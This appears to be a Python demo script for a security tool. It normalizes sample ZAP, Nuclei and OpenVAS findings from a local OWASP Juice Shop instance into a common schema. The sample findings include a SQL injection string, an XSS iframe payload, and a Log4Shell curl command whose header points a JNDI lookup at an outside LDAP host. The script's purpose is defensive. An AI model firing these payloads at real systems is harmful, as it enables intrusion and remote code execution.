"""
Juice Shop & Vulnerable Web Application Normalization Demo.

Demonstrates the normalization layer processing realistic scan findings
from OWASP Juice Shop and vulnerable web applications across Nuclei, OWASP ZAP, and OpenVAS.
"""

import json
from normalization import (
    CanonicalScanResult,
    Normalizer,
    normalize_findings,
    normalize_scan_result,
)

# Realistic raw findings from OWASP Juice Shop scan (Nuclei + ZAP + OpenVAS)
JUICE_SHOP_RAW_FINDINGS = [
    # 1. ZAP: SQL Injection in Juice Shop Search / Login API
    {
        "scanner": "zap",
        "pluginId": "40018",
        "alert": "SQL Injection - SQLite",
        "risk": "High",
        "confidence": "Medium",
        "url": "http://localhost:3000/rest/products/search?q=apple'))--",
        "param": "q",
        "attack": "apple'))--",
        "evidence": "SQLITE_ERROR: near \")\": syntax error",
        "cweid": "89",
        "wascid": "19",
        "description": "SQL injection vulnerability in Juice Shop product search endpoint allows extracting user credentials and password hashes from sqlite database.",
        "solution": "Use parameterized prepared statements with Sequelize ORM.",
        "reference": "https://owasp.org/www-project-juice-shop/\nhttps://cwe.mitre.org/data/definitions/89.html",
        "method": "GET"
    },
    # 2. Nuclei: Exposed Swagger / API Documentation in Juice Shop
    {
        "scanner": "nuclei",
        "template-id": "swagger-api-exposed",
        "info": {
            "name": "Exposed Swagger API Documentation",
            "severity": "low",
            "description": "Swagger UI interactive API documentation was found exposed on the Juice Shop endpoint.",
            "reference": [
                "https://swagger.io/docs/specification/about/"
            ],
            "tags": ["exposure", "swagger", "api", "juice-shop"],
            "classification": {
                "cwe-id": ["cwe-200"],
                "cvss-score": 3.5
            }
        },
        "type": "http",
        "host": "http://localhost:3000",
        "matched-at": "http://localhost:3000/api-docs/",
        "matcher-name": "swagger-json-matcher",
        "extracted-results": ["Swagger UI 3.0.0"]
    },
    # 3. ZAP: Reflected Cross-Site Scripting (XSS) in Track Order
    {
        "scanner": "zap",
        "pluginId": "40012",
        "alert": "Cross-Site Scripting (Reflected)",
        "risk": "High",
        "confidence": "High",
        "url": "http://localhost:3000/#/track-result?id=<iframe src=\"javascript:alert(`xss`)\">",
        "param": "id",
        "attack": "<iframe src=\"javascript:alert(`xss`)\">",
        "evidence": "<iframe src=\"javascript:alert(`xss`)\">",
        "cweid": "79",
        "wascid": "8",
        "description": "User-controlled input in order tracking parameter is rendered unsanitized in the browser DOM.",
        "solution": "Sanitize and encode all untrusted inputs before rendering them in DOM elements.",
        "reference": "https://owasp.org/www-community/attacks/xss/",
        "method": "GET"
    },
    # 4. Nuclei: Log4j Remote Code Execution in Backend Service
    {
        "scanner": "nuclei",
        "template-id": "cve-2021-44228-log4j",
        "info": {
            "name": "Apache Log4j RCE (Log4Shell)",
            "severity": "critical",
            "description": "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP endpoints.",
            "reference": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
            ],
            "tags": ["cve", "cve2021", "rce", "oast", "log4j"],
            "remediation": "Upgrade Log4j dependency to 2.17.1 or higher.",
            "classification": {
                "cve-id": "CVE-2021-44228",
                "cwe-id": ["cwe-502"],
                "cvss-score": 10.0
            }
        },
        "type": "http",
        "host": "http://localhost:3000",
        "matched-at": "http://localhost:3000/rest/user/login",
        "matcher-name": "interactsh-matcher",
        "curl-command": "curl -X POST -H 'User-Agent: ${jndi:ldap://interact.sh/a}' http://localhost:3000/rest/user/login"
    },
    # 5. ZAP: Missing Anti-Clickjacking Header (Security Misconfiguration)
    {
        "scanner": "zap",
        "pluginId": "10020",
        "alert": "Anti-clickjacking Header Not Implemented",
        "risk": "Medium",
        "confidence": "Medium",
        "url": "http://localhost:3000/",
        "param": "",
        "cweid": "1021",
        "description": "The response does not include Content-Security-Policy with frame-ancestors or X-Frame-Options header.",
        "solution": "Set 'X-Frame-Options: SAMEORIGIN' or 'Content-Security-Policy: frame-ancestors 'self''.",
        "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
        "method": "GET"
    },
    # 6. OpenVAS: Vulnerable Node.js Component / Outdated Library
    {
        "scanner": "openvas",
        "nvt": {
            "oid": "1.3.6.1.4.1.25623.1.0.145020",
            "name": "Node.js Express Framework Prototype Pollution Vulnerability",
            "cve": "CVE-2022-29078",
            "cwe": "1321",
            "cvss_base": "7.5",
            "threat": "High",
            "summary": "Outdated Express / ejs dependency allows prototype pollution through query string parser.",
            "solution": "Upgrade package dependencies to latest patched releases.",
            "xref": "URL:https://nvd.nist.gov/vuln/detail/CVE-2022-29078"
        },
        "host": "localhost",
        "port": "3000/tcp",
        "qod": "High",
        "report": "Package ejs 3.1.6 detected in package-lock.json."
    }
]


def run_demo():
    print("=" * 80)
    print("      OWASP JUICE SHOP - MULTI-SCANNER NORMALIZATION DEMO")
    print("=" * 80)
    print(f"\nIngesting {len(JUICE_SHOP_RAW_FINDINGS)} raw findings across Nuclei, ZAP, and OpenVAS...")

    # Normalize findings into CanonicalScanResult
    target_url = "http://localhost:3000"
    scan_result: CanonicalScanResult = normalize_scan_result(target_url, JUICE_SHOP_RAW_FINDINGS)

    print("\n" + "-" * 80)
    print("CANONICAL NORMALIZED FINDINGS:")
    print("-" * 80)

    for idx, f in enumerate(scan_result.findings, start=1):
        print(f"\n[Finding #{idx}]")
        print(f"  Title:        {f.title}")
        print(f"  Scanner:      {f.scanner.upper()}")
        print(f"  Severity:     {f.severity.value}")
        print(f"  Category:     {f.category}")
        print(f"  CVE:          {f.cve or 'N/A'}")
        print(f"  CWE:          {f.cwe or 'N/A'}")
        print(f"  CVSS Score:   {f.cvss if f.cvss is not None else 'N/A'}")
        print(f"  Confidence:   {f.confidence.value if f.confidence else 'N/A'}")
        print(f"  Asset:        {f.asset}")
        print(f"  URLs:         {f.urls}")
        print(f"  Parameter:    {f.parameter or 'N/A'}")
        print(f"  Finding ID:   {f.finding_id}")
        print(f"  Fingerprint:  {f.fingerprint[:16]}... (for Deduplication)")

    print("\n" + "=" * 80)
    print("SAMPLE JSON OUTPUT (Ready for Deduplication & Threat Intelligence):")
    print("=" * 80)

    formatted_json = json.dumps(scan_result.to_dict(), indent=2)
    print(formatted_json[:1200] + "\n... [truncated for display]")

    print("\n" + "=" * 80)
    print("SUMMARY STATS:")
    print("=" * 80)
    severities = {}
    categories = {}
    for f in scan_result.findings:
        severities[f.severity.value] = severities.get(f.severity.value, 0) + 1
        cat = f.category or "Unknown"
        categories[cat] = categories.get(cat, 0) + 1

    print("Findings by Severity:")
    for sev, count in severities.items():
        print(f"  - {sev:<10}: {count}")

    print("\nFindings by Category:")
    for cat, count in categories.items():
        print(f"  - {cat:<35}: {count}")

    print("\n[OK] All findings successfully transformed to Canonical Schema!")


if __name__ == "__main__":
    run_demo()
